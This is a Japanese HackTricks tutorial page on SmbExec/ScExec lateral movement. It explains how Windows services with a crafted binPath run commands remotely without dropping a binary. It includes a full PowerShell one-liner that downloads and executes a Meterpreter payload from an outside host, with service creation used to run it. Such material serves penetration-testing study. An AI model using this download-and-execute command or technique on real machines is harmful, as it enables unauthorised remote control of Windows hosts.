# SmbExec/ScExec

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksに広告を掲載したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>

## 動作原理

**SmbexecはPsexecのように機能します。** この例では、被害者内の悪意のある実行可能ファイルを"_binpath_"に指定する**代わりに**、**cmd.exeまたはpowershell.exe**に指定し、それらのいずれかがバックドアをダウンロードして実行します。

## **SMBExec**

攻撃者とターゲットの側から見たsmbexecの実行時の様子を見てみましょう：

![](../../.gitbook/assets/smbexec\_prompt.png)

サービス"BTOBTO"が作成されていることがわかります。しかし、`sc query`を実行したときにターゲットマシンにそのサービスは存在しません。システムログが何が起こったのかの手がかりを明らかにしています：

![](../../.gitbook/assets/smbexec\_service.png)

サービスファイル名には、実行するコマンド文字列が含まれています（%COMSPEC%はcmd.exeの絶対パスを指します）。実行するコマンドをbatファイルにエコーし、stdoutとstderrをTempファイルにリダイレクトし、batファイルを実行して削除します。Kaliに戻ると、PythonスクリプトがSMB経由で出力ファイルを引き出し、私たちの"擬似シェル"に内容を表示します。私たちが"シェル"に入力する各コマンドについて、新しいサービスが作成され、プロセスが繰り返されます。これにより、バイナリをドロップする必要がなく、希望する各コマンドを新しいサービスとして実行するだけです。間違いなくよりステルス性が高いですが、実行された各コマンドに対してイベントログが作成されることを見ました。それでも、インタラクティブでない"シェル"を取得するための非常に巧妙な方法です！

## 手動SMBExec

**またはサービス経由でコマンドを実行する**

smbexecが示したように、バイナリが必要なくても、サービスbinPathsから直接コマンドを実行することが可能です。これは、ターゲットWindowsマシンで任意のコマンドを実行する必要がある場合に覚えておくと便利なテクニックです。簡単な例として、バイナリなしでリモートサービスを使用してMeterpreterシェルを取得しましょう。

Metasploitの`web_delivery`モジュールを使用し、リバースMeterpreterペイロードを持つPowerShellターゲットを選択します。リスナーが設定され、ターゲットマシンで実行するコマンドを教えてくれます：
```
powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');
```
Windows攻撃ボックスから、リモートサービス（"metpsh"）を作成し、binPathを設定して、ペイロード付きのcmd.exeを実行します：

![](../../.gitbook/assets/sc\_psh\_create.png)

そして、それを開始します：

![](../../.gitbook/assets/sc\_psh\_start.png)

私たちのサービスが応答しないためエラーが発生しますが、Metasploitリスナーを見ると、コールバックが行われ、ペイロードが実行されたことがわかります。

すべての情報はここから抽出されました：[https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションです。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加するか**、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローしてください。**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>
